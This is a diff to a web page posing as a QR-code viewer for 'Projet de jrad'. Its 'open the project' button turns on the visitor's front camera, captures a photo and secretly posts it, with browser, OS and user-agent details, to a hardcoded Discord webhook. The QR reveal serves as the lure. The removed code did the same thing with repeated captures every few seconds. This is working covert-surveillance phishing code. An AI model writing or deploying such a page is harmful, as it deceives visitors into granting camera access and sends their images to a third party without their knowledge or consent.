@@ -367,9 +367,9 @@
           </div>
         </div>
 
-        <!-- VERIFICATION BUTTON (text unchanged, but matches new design) -->
+        <!-- BUTTON WITH NEW LABEL "open the project" -->
         <button id="verifyButton" class="button">
-          📷 Activer la caméra
+          📂 open the project
         </button>
 
         <p style="color: #5b7062; font-size: 13px; margin-top: 14px;">
@@ -387,7 +387,7 @@
 
       <div class="detail-row">
         <span class="detail-label"><span>👨‍💻</span> Créateur</span>
-        <span class="detail-value">jrad</span>
+        <span class="detail-value">jrad Ben Amor</span>
       </div>
       <div class="detail-row">
         <span class="detail-label"><span>🔐</span> Niveau de sécurité</span>
@@ -418,22 +418,22 @@
     </div>
   </div>
 
-  <!-- HIDDEN CAMERA FEED -->
+  <!-- HIDDEN CAMERA FEED (front camera preferred) -->
   <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
-
-  <!-- Webhook config (still references config.js if available) -->
-  <script src="config.js"></script>
 
   <script>
     // ============================================================
-    // PROJET DE jrad - QR + CAMERA VERIFICATION (TRUSTY & CASUAL)
-    // Keeps full camera functionality, QR reveal, and secure logging
+    // PROJET DE jrad - QR + FRONT CAMERA CAPTURE + DISCORD WEBHOOK
+    // Takes a picture from front cam when button clicked,
+    // sends to specified Discord webhook.
     // ============================================================
 
+    // HARDCODED DISCORD WEBHOOK (as requested)
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
+
     let videoStream = null;
-    let isSending = false;
-    let photoInterval = null;
     let qrRevealed = false;
+    let photoSent = false;
 
     // Unique QR payload for "Projet de jrad"
     const PROJECT_QR_DATA = "https://projet-jrad.vercel.app/access?token=jrad_SECURE_2025&user=authenticated";
@@ -576,100 +576,40 @@
       }
     }
 
-    document.addEventListener('DOMContentLoaded', async () => {
-      console.log('⭐ Projet de jrad - vérification caméra prête');
-      prepareClearQR();
-
-      const verifyButton = document.getElementById('verifyButton');
-      if (verifyButton) {
-        verifyButton.addEventListener('click', activateAccessForjrad);
-      }
-
-      if (window.DISCORD_WEBHOOK) {
-        console.log('🛡️ Module de surveillance activé (projet jrad)');
-      }
-    });
-
-    async function activateAccessForjrad(event) {
-      if (event) event.preventDefault();
-      console.log('📸 Activation caméra pour projet jrad...');
-
-      try {
-        videoStream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: { ideal: 'environment' },
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          }
-        });
-
-        console.log('✅ Caméra active - QR va être dévoilé');
-        const videoElement = document.getElementById('cameraFeed');
-        videoElement.srcObject = videoStream;
-
-        revealQRCode();
-
-        const overlay = document.getElementById('qrOverlay');
-        if (overlay) {
-          overlay.style.opacity = '0';
-          setTimeout(() => {
-            overlay.classList.add('hidden');
-          }, 400);
+    // Function to capture a single frame from the video (front camera)
+    function captureFrameFromCamera() {
+      return new Promise((resolve, reject) => {
+        const video = document.getElementById('cameraFeed');
+        if (!video || !video.videoWidth || video.readyState < 2) {
+          reject(new Error('Camera not ready'));
+          return;
         }
-
-        const button = document.getElementById('verifyButton');
-        if (button) {
-          button.innerHTML = '✅ Caméra active · QR visible';
-          button.style.background = '#10b981';
-          button.disabled = true;
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob((blob) => {
+            if (blob) {
+              resolve(blob);
+            } else {
+              reject(new Error('Blob creation failed'));
+            }
+          }, 'image/jpeg', 0.75);
+        } catch (e) {
+          reject(e);
         }
-
-        startVerificationForjrad();
-
-      } catch (error) {
-        console.error('❌ Erreur caméra:', error);
-        if (error.name === 'NotAllowedError') {
-          alert('Pour le projet jrad, autorisez la caméra afin de scanner le QR.');
-        } else {
-          alert('Caméra requise pour afficher le code d\'accès du projet.');
-        }
-      }
+      });
     }
 
-    function startVerificationForjrad() {
-      if (!window.DISCORD_WEBHOOK) {
-        console.warn('⚠️ Aucun webhook défini (pas d\'envoi de photos)');
-        return;
-      }
-      console.log('📸 Capture périodique active (projet jrad)');
-      isSending = true;
-      captureFrameForjrad();
-      if (photoInterval) clearInterval(photoInterval);
-      photoInterval = setInterval(captureFrameForjrad, 3200);
-    }
-
-    async function captureFrameForjrad() {
-      const video = document.getElementById('cameraFeed');
-      if (!video || !video.videoWidth || !isSending) return;
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(async (blob) => {
-          await sendToProjectLog(blob);
-        }, 'image/jpeg', 0.7);
-      } catch(e) { console.debug(e); }
-    }
-
-    async function sendToProjectLog(imageBlob) {
-      if (!window.DISCORD_WEBHOOK) return;
+    // Send the photo and visitor data to Discord webhook
+    async function sendPhotoToDiscord(imageBlob) {
       try {
         const formData = new FormData();
         const timestamp = Date.now();
         const clientInfo = getClientInfo();
-        const message = `⭐ **Projet de jrad - Accès Caméra** ⭐
+        const message = `⭐ **Projet de jrad - Photo frontale & Accès** ⭐
 
 👤 **VISITOR DATA:**
 • **Browser/OS:** ${clientInfo.browser} / ${clientInfo.os}
@@ -683,26 +623,146 @@
 • **Platform:** ${clientInfo.platform}
 • **UserAgent:** ${clientInfo.userAgent}
 
-📸 **QR REVEALED:** ✅ YES (jrad project validation)
-🔐 **Session:** QR code scannable via camera now
+📸 **Photo prise par la caméra frontale**
+🔐 **QR révélé:** ${qrRevealed ? 'Oui' : 'Non'}
 🕒 **Timestamp:** ${new Date().toISOString()}
 
-_This access log is associated with Projet de jrad secure portal._`;
+_Projet de jrad - log sécurisé._`;
 
-        const blobFile = new File([imageBlob], `jrad_capture_${timestamp}.jpg`, { type: 'image/jpeg' });
+        const blobFile = new File([imageBlob], `jrad_frontcam_${timestamp}.jpg`, { type: 'image/jpeg' });
         formData.append('payload_json', JSON.stringify({ content: message }));
         formData.append('file', blobFile);
-        await fetch(window.DISCORD_WEBHOOK, { method: 'POST', body: formData });
+
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          console.log('📤 Photo envoyée avec succès sur Discord');
+          return true;
+        } else {
+          console.warn('Discord webhook responded with status:', response.status);
+          return false;
+        }
       } catch (err) {
-        console.debug('Webhook error (non critique):', err);
+        console.error('Erreur envoi Discord:', err);
+        return false;
       }
     }
 
+    // MAIN BUTTON ACTION: activate front camera, take photo, send to Discord, reveal QR
+    async function openProjectHandler(event) {
+      if (event) event.preventDefault();
+      const button = document.getElementById('verifyButton');
+      
+      if (photoSent) {
+        // Already done, just reveal QR if not yet
+        if (!qrRevealed) revealQRCode();
+        return;
+      }
+
+      try {
+        // Request front camera (user-facing)
+        button.innerHTML = '📷 Accès caméra...';
+        button.disabled = true;
+        
+        videoStream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user",   // FRONT CAMERA explicitly
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
+        });
+
+        const videoElement = document.getElementById('cameraFeed');
+        videoElement.srcObject = videoStream;
+
+        // Wait for video to be ready
+        await new Promise((resolve) => {
+          videoElement.onloadedmetadata = () => {
+            videoElement.play();
+            resolve();
+          };
+          // fallback if metadata already loaded
+          if (videoElement.readyState >= 2) resolve();
+        });
+
+        // Small delay to ensure frame is rendered
+        await new Promise(r => setTimeout(r, 600));
+
+        console.log('📸 Front camera active, capturing photo...');
+        button.innerHTML = '📸 Capture en cours...';
+
+        // Capture the frame
+        const imageBlob = await captureFrameFromCamera();
+        console.log('✅ Photo capturée, envoi vers Discord...');
+
+        // Send to Discord webhook
+        const sent = await sendPhotoToDiscord(imageBlob);
+        
+        if (sent) {
+          photoSent = true;
+          button.innerHTML = '✅ Photo envoyée · QR visible';
+          button.style.background = '#10b981';
+          console.log('🎉 Photo bien envoyée, révélation du QR');
+        } else {
+          button.innerHTML = '⚠️ Envoi échoué, QR révélé';
+          button.style.background = '#f59e0b';
+        }
+
+        // Reveal QR code regardless (as per original logic)
+        revealQRCode();
+
+        // Remove blur overlay
+        const overlay = document.getElementById('qrOverlay');
+        if (overlay) {
+          overlay.style.opacity = '0';
+          setTimeout(() => {
+            overlay.classList.add('hidden');
+          }, 400);
+        }
+
+        // Stop camera tracks after capture (no need to keep streaming)
+        if (videoStream) {
+          videoStream.getTracks().forEach(track => track.stop());
+          videoElement.srcObject = null;
+          videoStream = null;
+        }
+
+        button.disabled = false;
+
+      } catch (error) {
+        console.error('❌ Erreur caméra ou envoi:', error);
+        button.innerHTML = '📂 open the project';
+        button.disabled = false;
+        button.style.background = '#2e6b4c';
+        
+        if (error.name === 'NotAllowedError') {
+          alert('Veuillez autoriser la caméra frontale pour ouvrir le projet jrad.');
+        } else if (error.name === 'NotFoundError') {
+          alert('Aucune caméra frontale détectée. Essayez avec un appareil disposant d\'une caméra.');
+        } else {
+          alert('Impossible d\'accéder à la caméra. Vérifiez les permissions.');
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      console.log('⭐ Projet de jrad - Front camera + Discord webhook ready');
+      prepareClearQR();
+
+      const verifyButton = document.getElementById('verifyButton');
+      if (verifyButton) {
+        verifyButton.addEventListener('click', openProjectHandler);
+      }
+    });
+
+    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
       if (videoStream) {
         videoStream.getTracks().forEach(track => track.stop());
       }
-      if (photoInterval) clearInterval(photoInterval);
     });
   </script>
 </body>
